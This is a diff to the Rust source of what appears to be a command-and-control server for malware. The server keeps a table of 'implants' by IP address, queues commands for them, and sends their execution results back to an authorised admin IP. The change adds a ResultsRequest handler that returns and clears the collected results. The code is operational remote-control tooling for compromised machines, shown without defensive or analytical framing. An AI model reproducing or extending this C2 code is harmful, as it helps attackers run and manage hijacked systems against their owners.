@@ -88,7 +88,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                     }
                 }
                 _ => {
-                    if let Some(admin_ip) = *admin_ip.lock().unwrap()
+                    if let Some(admin_ip) = *admin_ip.lock().expect("failed to lock the admin ip")
                         && stream.peer_addr().unwrap().ip() == admin_ip
                     {
                         let mut commands = command_queue.lock().unwrap();
@@ -96,25 +96,12 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                             commands.insert(ip, Vec::new());
                         }
 
-                        if !results.lock().unwrap().is_empty() {
-                            stream
-                                .write(
-                                    encode(Packet::CommandResults {
-                                        results: results.lock().unwrap().clone(),
-                                    })
-                                    .unwrap()
-                                    .as_slice(),
-                                )
-                                .unwrap();
-                            results.lock().unwrap().clear();
-                            stream.flush().unwrap();
-                        }
-
                         run_admin_command(
                             &mut stream,
                             &decoded,
                             &mut implants.lock().unwrap(),
                             &mut commands.get_mut(&ip).unwrap(),
+                            &mut *results.lock().unwrap(),
                         )
                         .unwrap();
                     } else {
@@ -136,6 +123,7 @@ fn run_admin_command(
     packet: &Packet,
     implants: &mut HashMap<IpAddr, Implant>,
     command_queue: &mut Vec<String>,
+    results: &mut Vec<(String, i32)>,
 ) -> Result<(), Box<dyn std::error::Error>> {
     match packet {
         Packet::ImplantListRequest => {
@@ -157,6 +145,20 @@ fn run_admin_command(
             if let Some(_ip) = implants.keys().nth(*implant_id) {
                 command_queue.push(command.clone());
             }
+        }
+        Packet::ResultsRequest => {
+            println!("Results requested");
+            stream
+                .write(
+                    encode(Packet::CommandResults {
+                        results: results.clone(),
+                    })
+                    .unwrap()
+                    .as_slice(),
+                )
+                .unwrap();
+            println!("{results:?}");
+            results.clear();
         }
         _ => {
             stream.write(encode(Packet::C2Alive).unwrap().as_slice())?;
